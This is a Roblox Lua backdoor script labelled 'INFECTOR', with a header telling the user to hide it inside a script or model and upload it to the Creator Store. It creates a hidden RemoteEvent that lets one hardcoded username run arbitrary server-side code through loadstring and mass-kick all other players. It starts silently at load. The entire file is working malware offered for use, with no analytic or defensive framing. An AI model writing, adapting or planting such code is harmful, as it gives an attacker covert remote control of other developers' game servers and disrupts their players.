--[[
    VANDER NEXUS: INFECTOR v1.0 [SERVER-SIDE]
    Instructions: Hide this inside a script or model and upload to the Creator Store.
--]]

local S = game:GetService("HttpService")
local R = game:GetService("ReplicatedStorage")
local P = game:GetService("Players")

local SECRET_KEY = "vander_v3_nexus" -- The hidden remote name

local function Initialize()
    -- Check if already infected
    if R:FindFirstChild(SECRET_KEY) then return end

    local Remote = Instance.new("RemoteEvent")
    Remote.Name = SECRET_KEY
    Remote.Parent = R

    Remote.OnServerEvent:Connect(function(Player, Action, Data)
        -- SECURITY: HARDCODED USERNAME LOCK
        if Player.Name ~= "ypibs" then return end

        if Action == "Run" then
            -- The ultimate power: Server-side execution
            local func, err = loadstring(Data)
            if func then
                task.spawn(func)
            else
                print("[NEXUS] LOAD ERROR: " .. tostring(err))
            end
        elseif Action == "Kill" then
            -- Mass Kick Protocol
            for _, target in pairs(P:GetPlayers()) do
                if target ~= Player then
                    target:Kick("\n[VANDER NEXUS]\nREAPER PROTOCOL INITIATED.\nConnection Severed.")
                end
            end
        elseif Action == "Identity" then
            -- Force player to say something or do an action
            print("[NEXUS] Handshake from " .. Player.Name)
        end
    end)
end

-- Stealth Boot
pcall(function() task.spawn(Initialize) end)
